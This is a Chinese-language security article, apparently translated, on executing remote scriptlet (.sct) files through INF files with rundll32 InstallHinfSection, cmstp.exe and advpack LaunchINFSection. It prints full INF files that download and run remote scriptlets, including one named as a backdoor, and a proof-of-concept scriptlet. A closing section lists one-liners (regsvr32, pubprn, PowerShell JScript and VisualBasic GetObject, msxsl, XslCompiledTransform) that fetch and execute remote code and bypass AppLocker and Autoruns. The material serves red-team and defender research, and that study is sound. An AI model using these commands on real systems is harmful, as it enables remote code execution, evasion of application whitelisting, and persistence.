  * 简介
  * INF Script执行方法
    * 使用InstallHinfSection执行INF Script脚本
    * 使用CMSTP执行INF Script脚本
    * 使用LaunchINFSection执行INF Script脚本
  * 使用和防御方法
    * 恶意软件
    * 绕过，免杀和持久化
    * 网络中的流量
    * 任意文件名
    * 其它方法
      * RegSvr32/Scrobj.dll
      * PubPrn
      * 通过PowerShell拼接Microsoft.JScript.Eval
      * 通过PowerShell拼接Microsoft.VisualBasic.Interaction
      * MsXSL
      * 通过PowerShell拼接System.Xml.Xsl.XslCompiledTransform

## 简介

通过对MSDN上一些处理不同COM脚本的调查和测试，结合网上的分享，我发现了一些有意思的东西，这些发现可能是远程调用执行脚本新方法。  
其中最有意思的是`LaunchINFSection`。

这篇文章主要讨论一下网上公开的利用`INF
Script`的方法，并介绍下`LaunchINFSection`，最后再分享一些用法和作为防御者应该注意的事项。另外，还会给出一些其他远程执行脚本方法的参考。

## `INF Script`执行方法

通过INF配置文件来执行脚本文件（`.sct`）的方法会涉及到`InstallHinfSection(setipapi.dll)`，`CMSTP`和`LaunchINFSection(advpack.dll)`。

### 使用`InstallHinfSection`执行`INF Script`脚本

在DerbyCon
2017中`KyleHanslovan`和`ChrisBisnett`展示了一个非常有意思的东西，我已经将其翻译和整理过来（传送门：[透过Autoruns看持久化绕过姿势的分享](http://www.m0nst3r.me/web-sec/290.html) ）。他们展示 了一种通过INF 远程调用执行`sct`脚本文件的方法：  
`rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 [path to
file.inf]`

作者给出的INF文件如下：

  1. `; ----------------------------------------------------------------------`
  2. `; Required Sections`
  3. `; ----------------------------------------------------------------------`
  4. `[Version] `
  5. `Signature=$CHICAGO$`
  6. `Provider=test`
  7. `Class=Printer`
  8.   

  9. `[Manufacturer]`
  10. `HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64`
  11.   

  12. `; ----------------------------------------------------------------------`
  13. `; Models Section`
  14. `; ----------------------------------------------------------------------`
  15. `[ModelsSection.NTx86]`
  16. `UnregisterDlls = Squiblydoo`
  17.   

  18. `[ModelsSection.NTia64]`
  19. `UnregisterDlls = Squiblydoo`
  20.   

  21. `[ModelsSection.NTamd64]`
  22. `UnregisterDlls = Squiblydoo`
  23.   

  24. `; ----------------------------------------------------------------------`
  25. `; Support Sections`
  26. `; ----------------------------------------------------------------------`
  27. `[DefaultInstall]`
  28. `UnregisterDlls = Squiblydoo`
  29.   

  30. `[Squiblydoo]`
  31. `11,,scrobj.dll,2,60,https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/ef22366bfb62a2ddea8c5e321d3ce2f4c95d2a66/Backdoor-Minimalist.sct`

上面的命令会去调用默认INF块，即`DefaultInstall`，在这个块下，通过`UnregisterDlls`调用了`Squiblydoo`块下的恶意命令，通过`scrobj.dll`下载并执行指定的脚本文件。

### 使用`CMSTP`执行`INF Script`脚本

`NickTyrer`展示了一种用`cmstp.exe`加载INF文件来下载SCT脚本并执行COM脚本文件的方法。`Oddvarmoe`曾展示了用`cmdtp.exe`来绕过UAC和AppLocker默认策略。  
基本用法如下：  
`cmstp.exe /s [file].inf`

INF文件内容参考如下：

  1. `;cmstp.exe /s cmstp.inf`
  2.   

  3. `[version]`
  4. `Signature=$chicago$`
  5. `AdvancedINF=2.5`
  6.   

  7. `[DefaultInstall_SingleUser]`
  8. `UnRegisterOCXs=UnRegisterOCXSection`
  9.   

  10. `[UnRegisterOCXSection]`
  11. `%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct`
  12.   

  13. `[Strings]`
  14. `AppAct = "SOFTWARE\Microsoft\Connection Manager"`
  15. `ServiceName="Yay"`
  16. `ShortSvcName="Yay"`

通过如上的INF文件，`cmstp.exe`会调用文件中的`DefaultInstall_SingleUser`块。在这个块中，`UnRegisterOCXs`调用了`UnRegisterOCXSection`块来执行恶意操作，通过`scrobj.dll`来下载并执行指定的SCT脚本文件。

### 使用`LaunchINFSection`执行`INF Script`脚本

根据MSDN的说明，`LaunchINFSection`是Advanced INF Package
Installer（`advpack.dll`）的一个方法，用来调用INF文件中的某个块。从管理员的角度看，INF文件是一个用来安装设备驱动或Windows
`.cab`文件的指令文件，包括注册Windows二进制（exe,dll,ocx），在注册表中增加键值，或设置一些关键参数的操作。  
调用`LaunchINFSection`的方法如下：  
`rundll32.exe advpack.dll,LaunchINFSection [file].inf, [INF Section], [Path to
Cab].cab, [Installation Flags]`  
如果不指定`[INF
Section]`，`LaunchINFSection`将会调用默认的`DefaultInstall`块。另外，值得注意的是，`advpack.dll`还提供了`LaunchINFSectionEX`方法和与其它字符集兼容的`LaunchINFSectionA`，来完成`LaunchINFSection`同样的功能。

作为PoC例子，我们使用如下的INF和SCT文件来测试：

INF文件（保存为test.inf）：

  1. `;cmstp.exe /s cmstp.inf`
  2.   

  3. `[version]`
  4. `Signature=$chicago$`
  5. `AdvancedINF=2.5`
  6.   

  7. `[DefaultInstall_SingleUser]`
  8. `UnRegisterOCXs=UnRegisterOCXSection`
  9.   

  10. `[UnRegisterOCXSection]`
  11. `%11%\scrobj.dll,NI,https://gist.githubusercontent.com/bohops/6ded40c4989c673f2e30b9a6c1985019/raw/33dc4cae00a10eb86c02b561b1c832df6de40ef6/test.sct`
  12.   

  13. `[Strings]`
  14. `AppAct = "SOFTWARE\Microsoft\Connection Manager"`
  15. `ServiceName="Yay"`
  16. `ShortSvcName="Yay"`

SCT文件：

  1. `<?XML version="1.0"?>`
  2. `<scriptlet>`
  3.   

  4. `<registration`
  5. ` description="Bandit"`
  6. ` progid="Bandit"`
  7. ` version="1.00"`
  8. ` classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"`
  9. ` >`
  10.   

  11. ` <!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`
  12. ` <!-- DFIR -->`
  13. ` <!-- .sct files are downloaded and executed from a path like this -->`
  14. ` <!-- Though, the name and extension are arbitary.. -->`
  15. ` <!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->`
  16. ` <!-- Based on current research, no registry keys are written, since call "uninstall" -->`
  17.   

  18.   

  19. ` <!-- Proof Of Concept - Casey Smith @subTee --> `
  20. ` <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct -->`
  21. ` <script language="JScript">`
  22. ` <![CDATA[`
  23.   

  24. ` var r = new ActiveXObject("WScript.Shell").Run("calc.exe");`
  25.   

  26. ` ]]>`
  27. ` </script>`
  28. `</registration>`
  29.   

  30. `<public>`
  31. ` <method name="Exec"></method>`
  32. `</public>`
  33. `<script language="JScript">`
  34. `<![CDATA[`
  35.   

  36. ` function Exec()`
  37. ` {`
  38. ` var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");`
  39. ` }`
  40.   

  41. `]]>`
  42. `</script>`
  43.   

  44. `</scriptlet>`

使用下面的命令来执行一下：  
`rundll32.exe advpack.dll,LaunchINFSection
test.inf,DefaultInstall_SingleUser,1,`

如果网络没有问题的话，会出现我们可爱的计算器：

![343-calc-2.png](https://image.3001.net/images/20180312/15208395078642.png!small)  

这里，我们还可以用稍微不同的方法启动我们的程序，例如，把INF文件中的入口块改成`DefaultInstall`，那么我们就可以使用下面的命令执行程序，而无需指定一个块名字：

`rundll32.exe advpack.dll,LaunchINFSection test.inf,,1,`

![343-calc-3.png](https://image.3001.net/images/20180312/15208394813107.png!small)  

另外，我们也可以将卸载OCX的命令改成一个安装/注册的命令`RegisterOCXs`，并且随便一个名字来运行我们的程序：

  
![343-calc-4.png](https://image.3001.net/images/20180312/15208394501451.png!small)

## 使用和防御方法

### 恶意软件

  
![343-launchinfsectionmalware.png](https://image.3001.net/images/20180312/15208394951254.png!small)

![343-launchinfsectionmalware2.png](https://image.3001.net/images/20180312/15208395779795.png!small)  

  

### 绕过，免杀和持久化

CMSTP可用来绕过Autoruns（当开启隐藏Windows条目时），如下图：  
  

  
当不启用隐藏过滤功能时，CMSTP做的自启动项如下：

![343-cmstp_autoruns2.png](https://image.3001.net/images/20180312/15208396809929.png!small)  

注意：LaunchINFSection和InstallHinfSection不会以绕过新版本的Autoruns，因为这种启动方法依靠rundll32.exe调用相应的dll。当启用过滤时，Autoruns还是会显示这些自启动项。但是，`LaunchINFSection`提供了我们一种通过程序白名单绕过AppLocker规则来获得`代码执行`的技术。

### 网络中的流量

下图是通过scrobj.dll来下载一个SCT文件时产生的流量：  

  
![343-get_request.png](https://image.3001.net/images/20180312/1520839720560.png!small)

### 任意文件名

SCT文件只不过是`text/XML`文档，而INF文件只不过是`text`文档，其后缀扩展名可以不是`.sct`或`.inf`，但依然可以成功执行。（此处译者并没有实验成功，希望各位表哥赐教！）

### 其它方法

使用INF文件执行并不是唯一可以执行SCT脚本文件的方法，还有一些其它方法：

#### RegSvr32/Scrobj.dll

[RegSvr32/Scrobj.dll](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md)

`regsvr32 /s /n /u /i: http://url/file.sct scrobj.dll`

#### PubPrn

[PubPrn](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)

`pubprn.vbs 127.0.0.1 script:http ://url/file.sct`

#### 通过PowerShell拼接Microsoft.JScript.Eval

`[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:
http://url/file.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())`

#### 通过PowerShell拼接Microsoft.VisualBasic.Interaction

`[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:
http://url/file.sct').Exec(0)`

值得注意的是，`sct`并不是唯一一种文件，还有其他的，如：

#### MsXSL

[MsXSL](https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker)

`msxsl.exe http://url/file.xml http://url/file.xsl`

#### 通过PowerShell拼接System.Xml.Xsl.XslCompiledTransform

`$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object
System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object
System.Xml.Xsl.XslCompiledTransform;$x.Load('http://url/file.xsl',$s,$r);$x.Transform('http://url/file.xml','z');del
z;`

  

